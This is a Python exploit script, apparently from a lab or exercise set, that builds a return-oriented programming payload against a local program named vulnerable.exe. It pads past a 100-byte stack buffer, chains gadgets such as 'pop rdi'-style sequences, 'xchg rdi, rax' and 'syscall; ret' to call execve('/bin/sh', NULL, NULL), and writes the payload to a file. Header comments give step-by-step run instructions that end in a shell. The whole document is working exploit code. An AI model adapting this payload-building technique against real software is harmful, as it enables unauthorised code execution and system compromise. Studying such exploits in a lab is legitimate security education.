import os, sys
import subprocess
import collections
from exploitsCommon import *


# In order to run this exploit:
# - Run in a terminal:
#     - mkfifo ./bin/mypipe
#     - (cat ./bin/mypipe ; cat) | ./bin/vulnerable.exe
# - Run in another terminal:
#     - python3 ./exploits/payloadExecveShell.py && cat ./exploits/payloadExecveShell.dat > ./bin/mypipe
# - Go back to the first terminal and wait a few seconds. You now have a shell. Test with "echo hi"


if __name__ == "__main__":
    changeCWDToScriptDirectory()

    print('Scanning bytes...')
    instrSequences = getInstructionSequenceOutput('vulnerable.exe')

    # We want to make a payload that calls `execve("/bin/sh", NULL, NULL)`. For this we need:
    # - RAX = the system call number for execve, namely 59;
    # - First argument (RDI) = address of "/bin/sh" (which we place on the stack);
    # - Second argument (RSI) = 0 (NULL);
    # - Third argument (RDX) = 0 (NULL);
    # - Make the system call with the `syscall` instruction.

    payloadComponents = [
        b'\xFF' * 100, # Add padding to get over the stack buffer.
        b'\xFF' * 12, # Add padding to get over ??.
        b'\xFF' * 8, # Add padding to get over the stored RBP value.

        # Set RDI to "/bin/sh"
            # RBX = address of 'pop rax; ret' sequence
            findInstructionSequenceAddress(instrSequences, 'pop rbx; ret'),
            findInstructionSequenceAddress(instrSequences, 'pop rax; ret'),

            # - push RSP;
            # - execute sequence at RBX;
            # => RAX = RSP.
            findInstructionSequenceAddress(instrSequences, 'push rsp; push rbx; setne al; ret'),

            # RCX = offset value
            findInstructionSequenceAddress(instrSequences, 'pop rcx; ret'),
            (88).to_bytes(8, 'little'),

            # RAX += offset, such that RAX -> "/bin/sh" (at the end of the payload)
            findInstructionSequenceAddress(instrSequences, 'add rax, rcx; ret'),

            # Exchange the values in RAX and RDI, such that RDI -> "/bin/sh"
            findInstructionSequenceAddress(instrSequences, 'xchg rdi, rax; cld; ret'),

        # Set RSI to 0
        findInstructionSequenceAddress(instrSequences, 'pop rsi; ret'),
        (0).to_bytes(8, 'little'),

        # Set RDX to 0:
        # - ECX = 0;
        # - RDX = ECX;
        findInstructionSequenceAddress(instrSequences, 'xor ecx, ecx; ret'),
        findInstructionSequenceAddress(instrSequences, 'movsxd rdx, ecx; ret'),

        # RAX = 59; (system call number for `execve();`)
        findInstructionSequenceAddress(instrSequences, 'pop rax; ret'),
        (59).to_bytes(8, 'little'),

        # call `execve("/bin/sh", NULL, NULL)`
        findInstructionSequenceAddress(instrSequences, 'syscall; ret'),

        # Place this string in the payload so that we can get a pointer to it.
        convertStringToCStringBytes('/bin/sh'),
    ]
    payload = b''.join(payloadComponents)

    # Add more padding to make sure we go over the hardcoded stack buffer size.
    stackBufferSize = 400
    if len(payload) < stackBufferSize:
        remainingSize = stackBufferSize - len(payload)
        payload += b'\xFF' * remainingSize

    print(f"payload size = {len(payload)}")
    print(f"payload = {payload.hex()}")

    with open('payloadExecveShell.dat', 'wb') as fout:
        fout.write(payload)
